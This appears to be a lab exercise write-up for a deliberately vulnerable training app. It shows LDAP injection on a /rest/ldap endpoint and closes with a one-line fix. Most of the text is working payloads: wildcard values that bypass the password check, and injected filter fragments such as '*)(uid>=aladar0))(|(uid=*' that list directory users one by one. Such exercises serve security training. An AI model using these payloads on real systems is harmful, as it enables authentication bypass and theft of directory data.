# Exercise 8
The LDAP Service is vulnerable to LDAP injection.

We can use a wildcard to match the password to find user data without knowing the user's password:
>{{javulna_host}}/rest/ldap?username=kriszta&password=*

We can also use wildcards in the username to find user's whose name starts with a given letter
>{{javulna_host}}/rest/ldap?username=j*&password=*


## Find all data
By passing a wildcard for both username and password, we get the first user in the directory:
>{{javulna_host}}/rest/ldap?username=*&password=*

So we find **aladar**.

Now we know the first user, we can search for the first user alfabetically after 'aladar':
>{{javulna_host}}/rest/ldap?username=*)(uid>=aladar0))(|(uid=*&password=*

Now we know the next user is **geza**

We can keep repeating this until no user data is found any more:
>{{javulna_host}}/rest/ldap?username=*)(uid>=geza0))(|(uid=*&password=*

>{{javulna_host}}/rest/ldap?username=*)(uid>=kriszta0))(|(uid=*&password=*

## Fix
Use a LDAP filter builder to create a search filter based on exact match for username and password.